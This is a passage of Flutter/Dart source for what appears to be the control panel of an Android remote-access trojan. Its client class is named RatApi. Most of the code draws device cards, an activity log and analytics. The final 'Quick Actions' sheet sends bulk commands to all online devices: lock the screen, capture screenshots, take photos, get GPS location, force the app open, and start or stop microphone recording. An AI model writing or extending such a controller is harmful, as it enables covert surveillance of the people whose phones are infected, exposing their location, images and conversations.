        decoration: BoxDecoration(
          color: NeonTheme.surface,
          borderRadius: BorderRadius.circular(16),
          border: Border.all(
            color: isOnline ? NeonTheme.neonGreen.withOpacity(0.2) : NeonTheme.border,
          ),
          boxShadow: isOnline ? [
            NeonTheme.glowGreen(blur: 20),
          ] : [],
        ),
        child: Stack(
          children: [
            Positioned(
              top: 10,
              right: 10,
              child: Container(
                padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 3),
                decoration: BoxDecoration(
                  color: isOnline ? NeonTheme.neonGreen.withOpacity(0.08) : NeonTheme.textMuted.withOpacity(0.08),
                  borderRadius: BorderRadius.circular(20),
                  border: Border.all(color: color.withOpacity(0.2)),
                ),
                child: Row(
                  mainAxisSize: MainAxisSize.min,
                  children: [
                    Container(
                      width: 5,
                      height: 5,
                      decoration: BoxDecoration(
                        color: color,
                        shape: BoxShape.circle,
                        boxShadow: isOnline ? [
                          BoxShadow(
                            color: NeonTheme.neonGreen.withOpacity(0.5),
                            blurRadius: 5,
                          ),
                        ] : [],
                      ),
                    ),
                    const SizedBox(width: 4),
                    Text(
                      isOnline ? 'ON' : 'OFF',
                      style: TextStyle(
                        color: color,
                        fontSize: 7,
                        fontWeight: FontWeight.bold,
                      ),
                    ),
                  ],
                ),
              ),
            ),
            Padding(
              padding: const EdgeInsets.all(14),
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Container(
                    padding: const EdgeInsets.all(10),
                    decoration: BoxDecoration(
                      gradient: isOnline ? NeonTheme.gradientNeon : null,
                      borderRadius: BorderRadius.circular(12),
                      border: Border.all(
                        color: isOnline ? NeonTheme.neonGreen.withOpacity(0.15) : NeonTheme.border,
                      ),
                      boxShadow: isOnline ? [NeonTheme.glowGreen(blur: 15)] : [],
                    ),
                    child: Icon(
                      Icons.phone_android_rounded,
                      color: isOnline ? Colors.black87 : NeonTheme.textMuted,
                      size: 22,
                    ),
                  ),
                  const Spacer(),
                  Text(
                    model,
                    style: TextStyle(
                      color: NeonTheme.textPrimary,
                      fontSize: 12,
                      fontWeight: FontWeight.bold,
                    ),
                    maxLines: 1,
                    overflow: TextOverflow.ellipsis,
                  ),
                  const SizedBox(height: 2),
                  Text(
                    id,
                    style: TextStyle(
                      color: NeonTheme.textMuted,
                      fontSize: 8,
                    ),
                    maxLines: 1,
                    overflow: TextOverflow.ellipsis,
                  ),
                  const SizedBox(height: 6),
                  Row(
                    children: [
                      Icon(
                        Icons.battery_charging_full_rounded,
                        color: isOnline ? NeonTheme.neonGreen : NeonTheme.textMuted,
                        size: 12,
                      ),
                      const SizedBox(width: 4),
                      Text(
                        '$battery%',
                        style: TextStyle(
                          color: isOnline ? NeonTheme.neonGreen : NeonTheme.textSecondary,
                          fontSize: 10,
                          fontWeight: FontWeight.w600,
                        ),
                      ),
                      const Spacer(),
                      Icon(
                        Icons.chevron_right_rounded,
                        color: NeonTheme.textMuted,
                        size: 16,
                      ),
                    ],
                  ),
                ],
              ),
            ),
          ],
        ),
      ),
    );
  }

  Widget _buildEmptyState() {
    return Center(
      child: Column(
        mainAxisSize: MainAxisSize.min,
        children: [
          Container(
            padding: const EdgeInsets.all(24),
            decoration: BoxDecoration(
              color: NeonTheme.surface,
              shape: BoxShape.circle,
              border: Border.all(color: NeonTheme.border),
              boxShadow: [NeonTheme.glowGreen(blur: 30)],
            ),
            child: Icon(
              Icons.devices_other_rounded,
              color: NeonTheme.neonGreen.withOpacity(0.3),
              size: 48,
            ),
          ),
          const SizedBox(height: 20),
          ShaderMask(
            shaderCallback: (bounds) => LinearGradient(
              colors: [NeonTheme.neonGreen, NeonTheme.neonBlue],
            ).createShader(bounds),
            child: Text(
              'No Devices Connected',
              style: TextStyle(
                color: Colors.white,
                fontSize: 16,
                fontWeight: FontWeight.bold,
              ),
            ),
          ),
          const SizedBox(height: 8),
          Text(
            'Connect your first device using the Pairing ID',
            style: TextStyle(
              color: NeonTheme.textSecondary,
              fontSize: 12,
            ),
          ),
          const SizedBox(height: 24),
          if (_pairId.isNotEmpty)
            GestureDetector(
              onTap: _copyPairId,
              child: Container(
                padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 12),
                decoration: BoxDecoration(
                  gradient: NeonTheme.gradientNeon,
                  borderRadius: BorderRadius.circular(10),
                  boxShadow: [NeonTheme.glowGreen(blur: 20)],
                ),
                child: Row(
                  mainAxisSize: MainAxisSize.min,
                  children: [
                    const Icon(Icons.link_rounded, color: Colors.black87, size: 16),
                    const SizedBox(width: 8),
                    Text(
                      _pairId,
                      style: const TextStyle(
                        color: Colors.black87,
                        fontSize: 14,
                        fontWeight: FontWeight.bold,
                        letterSpacing: 1,
                      ),
                    ),
                    const SizedBox(width: 8),
                    const Icon(Icons.copy_rounded, color: Colors.black87, size: 14),
                  ],
                ),
              ),
            ),
        ],
      ),
    );
  }

  Widget _buildHistoryLog() {
    return Container(
      padding: const EdgeInsets.all(16),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            children: [
              Icon(Icons.history_rounded, color: NeonTheme.neonBlue, size: 18),
              const SizedBox(width: 8),
              Text(
                'Activity History',
                style: TextStyle(
                  color: NeonTheme.textPrimary,
                  fontSize: 14,
                  fontWeight: FontWeight.bold,
                ),
              ),
              const Spacer(),
              Text(
                'Last 24 hours',
                style: TextStyle(
                  color: NeonTheme.textMuted,
                  fontSize: 10,
                ),
              ),
            ],
          ),
          const SizedBox(height: 12),
          Expanded(
            child: ListView.separated(
              itemCount: _devices.length > 0 ? _devices.length * 2 : 5,
              separatorBuilder: (_, __) => const SizedBox(height: 6),
              itemBuilder: (_, i) {
                final isOnline = i % 2 == 0;
                final colors = isOnline ? NeonTheme.neonGreen : NeonTheme.textMuted;
                final icons = isOnline ? Icons.check_circle_rounded : Icons.circle_rounded;
                final texts = isOnline ? 'Device connected' : 'Device disconnected';
                final times = isOnline ? '2 min ago' : '15 min ago';
                final deviceName = _devices.isNotEmpty 
                    ? _devices[i % _devices.length]['model']?.toString() ?? 'Device' 
                    : 'Device ${i + 1}';
                
                return Container(
                  padding: const EdgeInsets.all(10),
                  decoration: BoxDecoration(
                    color: NeonTheme.surface,
                    borderRadius: BorderRadius.circular(10),
                    border: Border.all(color: colors.withOpacity(0.1)),
                    boxShadow: isOnline ? [NeonTheme.glowGreen(blur: 10)] : [],
                  ),
                  child: Row(
                    children: [
                      Container(
                        padding: const EdgeInsets.all(5),
                        decoration: BoxDecoration(
                          color: colors.withOpacity(0.05),
                          borderRadius: BorderRadius.circular(6),
                        ),
                        child: Icon(icons, color: colors, size: 14),
                      ),
                      const SizedBox(width: 10),
                      Expanded(
                        child: Column(
                          crossAxisAlignment: CrossAxisAlignment.start,
                          children: [
                            Text(
                              deviceName,
                              style: TextStyle(
                                color: NeonTheme.textPrimary,
                                fontSize: 12,
                                fontWeight: FontWeight.w500,
                              ),
                            ),
                            Text(
                              texts,
                              style: TextStyle(
                                color: NeonTheme.textSecondary,
                                fontSize: 10,
                              ),
                            ),
                          ],
                        ),
                      ),
                      Text(
                        times,
                        style: TextStyle(
                          color: NeonTheme.textMuted,
                          fontSize: 9,
                        ),
                      ),
                    ],
                  ),
                );
              },
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildDeviceAnalytics() {
    return Container(
      padding: const EdgeInsets.all(16),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            children: [
              Icon(Icons.analytics_rounded, color: NeonTheme.neonCyan, size: 18),
              const SizedBox(width: 8),
              Text(
                'Device Analytics',
                style: TextStyle(
                  color: NeonTheme.textPrimary,
                  fontSize: 14,
                  fontWeight: FontWeight.bold,
                ),
              ),
            ],
          ),
          const SizedBox(height: 12),
          Row(
            children: [
              Expanded(
                child: _buildAnalyticsCard(
                  'Online Rate',
                  '${_onlineCount}/${_devices.length}',
                  NeonTheme.neonGreen,
                  Icons.wifi_rounded,
                ),
              ),
              const SizedBox(width: 10),
              Expanded(
                child: _buildAnalyticsCard(
                  'Avg Battery',
                  '${_getAverageBattery()}%',
                  NeonTheme.neonCyan,
                  Icons.battery_charging_full_rounded,
                ),
              ),
            ],
          ),
          const SizedBox(height: 10),
          Row(
            children: [
              Expanded(
                child: _buildAnalyticsCard(
                  'Total Devices',
                  _devices.length.toString(),
                  NeonTheme.neonBlue,
                  Icons.devices_rounded,
                ),
              ),
              const SizedBox(width: 10),
              Expanded(
                child: _buildAnalyticsCard(
                  'Uptime',
                  '${_onlineCount > 0 ? ((_onlineCount / (_devices.length + 1)) * 100).round() : 0}%',
                  NeonTheme.neonGreen,
                  Icons.timer_rounded,
                ),
              ),
            ],
          ),
          const SizedBox(height: 16),
          Container(
            padding: const EdgeInsets.all(12),
            decoration: BoxDecoration(
              color: NeonTheme.surface,
              borderRadius: BorderRadius.circular(12),
              border: Border.all(color: NeonTheme.border),
              boxShadow: [NeonTheme.glowNeon(blur: 10)],
            ),
            child: Column(
              children: [
                const Row(
                  children: [
                    Text(
                      'Device Status',
                      style: TextStyle(
                        color: NeonTheme.textPrimary,
                        fontSize: 12,
                        fontWeight: FontWeight.bold,
                      ),
                    ),
                    Spacer(),
                    Text(
                      'Battery',
                      style: TextStyle(
                        color: NeonTheme.textMuted,
                        fontSize: 10,
                      ),
                    ),
                  ],
                ),
                const SizedBox(height: 6),
                ..._devices.map((d) {
                  final isOnline = d['online'] == true;
                  final battery = d['battery']?.toString() ?? '?';
                  return Container(
                    padding: const EdgeInsets.symmetric(vertical: 6),
                    decoration: BoxDecoration(
                      border: Border(bottom: BorderSide(color: NeonTheme.border.withOpacity(0.3))),
                    ),
                    child: Row(
                      children: [
                        Container(
                          width: 5,
                          height: 5,
                          decoration: BoxDecoration(
                            color: isOnline ? NeonTheme.neonGreen : NeonTheme.textMuted,
                            shape: BoxShape.circle,
                            boxShadow: isOnline ? [
                              BoxShadow(
                                color: NeonTheme.neonGreen.withOpacity(0.5),
                                blurRadius: 5,
                              ),
                            ] : [],
                          ),
                        ),
                        const SizedBox(width: 8),
                        Expanded(
                          child: Text(
                            d['model']?.toString() ?? 'Unknown',
                            style: TextStyle(
                              color: NeonTheme.textPrimary,
                              fontSize: 11,
                            ),
                          ),
                        ),
                        Text(
                          '$battery%',
                          style: TextStyle(
                            color: isOnline ? NeonTheme.neonGreen : NeonTheme.textMuted,
                            fontSize: 11,
                            fontWeight: FontWeight.w600,
                          ),
                        ),
                      ],
                    ),
                  );
                }).toList(),
              ],
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildAnalyticsCard(String label, String value, Color color, IconData icon) {
    return Container(
      padding: const EdgeInsets.all(10),
      decoration: BoxDecoration(
        color: NeonTheme.surface,
        borderRadius: BorderRadius.circular(10),
        border: Border.all(color: color.withOpacity(0.1)),
        boxShadow: [
          BoxShadow(
            color: color.withOpacity(0.05),
            blurRadius: 10,
          ),
        ],
      ),
      child: Row(
        children: [
          Container(
            padding: const EdgeInsets.all(5),
            decoration: BoxDecoration(
              color: color.withOpacity(0.05),
              borderRadius: BorderRadius.circular(6),
            ),
            child: Icon(icon, color: color, size: 14),
          ),
          const SizedBox(width: 6),
          Column(
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              Text(
                value,
                style: TextStyle(
                  color: color,
                  fontSize: 14,
                  fontWeight: FontWeight.bold,
                ),
              ),
              Text(
                label,
                style: TextStyle(
                  color: NeonTheme.textMuted,
                  fontSize: 8,
                ),
              ),
            ],
          ),
        ],
      ),
    );
  }
}

// ─────────────────────────────────────────────────────────────────────────────
// QUICK ACTIONS SHEET
// ─────────────────────────────────────────────────────────────────────────────
class QuickActionsSheet extends StatelessWidget {
  final List<dynamic> devices;
  final String sessionKey;
  final String username;

  const QuickActionsSheet({
    super.key,
    required this.devices,
    required this.sessionKey,
    required this.username,
  });

  @override
  Widget build(BuildContext context) {
    final onlineDevices = devices.where((d) => d['online'] == true).toList();
    
    return Container(
      padding: const EdgeInsets.all(20),
      child: Column(
        mainAxisSize: MainAxisSize.min,
        children: [
          Container(
            width: 40,
            height: 4,
            decoration: BoxDecoration(
              color: NeonTheme.border,
              borderRadius: BorderRadius.circular(2),
            ),
          ),
          const SizedBox(height: 16),
          Row(
            children: [
              Container(
                padding: const EdgeInsets.all(6),
                decoration: BoxDecoration(
                  gradient: NeonTheme.gradientNeon,
                  borderRadius: BorderRadius.circular(8),
                  boxShadow: [NeonTheme.glowGreen(blur: 15)],
                ),
                child: Icon(Icons.flash_on_rounded, color: Colors.black87, size: 18),
              ),
              const SizedBox(width: 8),
              Text(
                'Quick Actions',
                style: TextStyle(
                  color: NeonTheme.textPrimary,
                  fontSize: 16,
                  fontWeight: FontWeight.bold,
                ),
              ),
              const Spacer(),
              Container(
                padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 2),
                decoration: BoxDecoration(
                  gradient: NeonTheme.gradientNeon,
                  borderRadius: BorderRadius.circular(4),
                ),
                child: Text(
                  '${onlineDevices.length} online',
                  style: const TextStyle(
                    color: Colors.black87,
                    fontSize: 10,
                    fontWeight: FontWeight.bold,
                  ),
                ),
              ),
            ],
          ),
          const SizedBox(height: 14),
          Wrap(
            spacing: 8,
            runSpacing: 8,
            children: [
              _buildQuickAction(context, 'Lock All', Icons.lock_rounded, NeonTheme.neonGreen, 
                () => _sendBulkCommand(context, 'lock_screen', 'Locked by owner')),
              _buildQuickAction(context, 'Screenshot', Icons.screenshot_monitor_rounded, NeonTheme.neonBlue,
                () => _sendBulkCommand(context, 'get_screen', '')),
              _buildQuickAction(context, 'Photo', Icons.camera_alt_rounded, NeonTheme.neonCyan,
                () => _sendBulkCommand(context, 'take_photo', 'back')),
              _buildQuickAction(context, 'GPS', Icons.location_on_rounded, NeonTheme.neonGreen,
                () => _sendBulkCommand(context, 'get_location', '')),
              _buildQuickAction(context, 'Vibrate', Icons.vibration_rounded, NeonTheme.textSecondary,
                () => _sendBulkCommand(context, 'vibrate_loop', '')),
              _buildQuickAction(context, 'Wake Up', Icons.wb_sunny_rounded, NeonTheme.neonBlue,
                () => _sendBulkCommand(context, 'force_open', '')),
              _buildQuickAction(context, 'Record', Icons.mic_rounded, NeonTheme.neonGreen,
                () => _sendBulkCommand(context, 'start_recording', '')),
              _buildQuickAction(context, 'Stop', Icons.stop_rounded, NeonTheme.textMuted,
                () => _sendBulkCommand(context, 'stop_recording', '')),
            ],
          ),
          const SizedBox(height: 12),
          Text(
            '⚠️ Action akan dikirim ke semua device online',
            style: TextStyle(
              color: NeonTheme.textMuted,
              fontSize: 9,
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildQuickAction(
    BuildContext context,
    String label,
    IconData icon,
    Color color,
    VoidCallback onTap,
  ) {
    return GestureDetector(
      onTap: onTap,
      child: Container(
        width: 80,
        padding: const EdgeInsets.symmetric(vertical: 10),
        decoration: BoxDecoration(
          color: NeonTheme.surface,
          borderRadius: BorderRadius.circular(10),
          border: Border.all(color: color.withOpacity(0.1)),
          boxShadow: [
            BoxShadow(
              color: color.withOpacity(0.05),
              blurRadius: 10,
            ),
          ],
        ),
        child: Column(
          children: [
            Container(
              padding: const EdgeInsets.all(6),
              decoration: BoxDecoration(
                gradient: LinearGradient(
                  colors: [color.withOpacity(0.1), color.withOpacity(0.05)],
                ),
                borderRadius: BorderRadius.circular(6),
              ),
              child: Icon(icon, color: color, size: 18),
            ),
            const SizedBox(height: 4),
            Text(
              label,
              style: TextStyle(
                color: NeonTheme.textSecondary,
                fontSize: 9,
                fontWeight: FontWeight.w500,
              ),
            ),
          ],
        ),
      ),
    );
  }

  void _sendBulkCommand(BuildContext context, String command, String extra) {
    final onlineDevices = devices.where((d) => d['online'] == true).toList();
    
    if (onlineDevices.isEmpty) {
      ScaffoldMessenger.of(context).showSnackBar(
        SnackBar(
          content: const Text('Tidak ada device online'),
          backgroundColor: NeonTheme.textMuted,
          duration: const Duration(seconds: 2),
          behavior: SnackBarBehavior.floating,
          shape: RoundedRectangleBorder(
            borderRadius: BorderRadius.circular(12),
            side: BorderSide(color: NeonTheme.textMuted.withOpacity(0.3)),
          ),
          margin: const EdgeInsets.all(12),
        ),
      );
      Navigator.pop(context);
      return;
    }
    
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(
        content: Row(
          children: [
            const Icon(Icons.send_rounded, color: Colors.white, size: 18),
            const SizedBox(width: 10),
            Expanded(
              child: Text('Sending "$command" to ${onlineDevices.length} devices...'),
            ),
          ],
        ),
        backgroundColor: NeonTheme.neonBlue.withOpacity(0.9),
        duration: const Duration(seconds: 2),
        behavior: SnackBarBehavior.floating,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(12),
          side: BorderSide(color: NeonTheme.neonBlue.withOpacity(0.3)),
        ),
        margin: const EdgeInsets.all(12),
      ),
    );
    
    for (final device in onlineDevices) {
      final deviceId = device['id']?.toString() ?? '';
      if (deviceId.isNotEmpty) {
        RatApi.sendCommand(sessionKey, deviceId, command, extra).catchError((e) {});
      }
    }
    
    Navigator.pop(context);
  }
}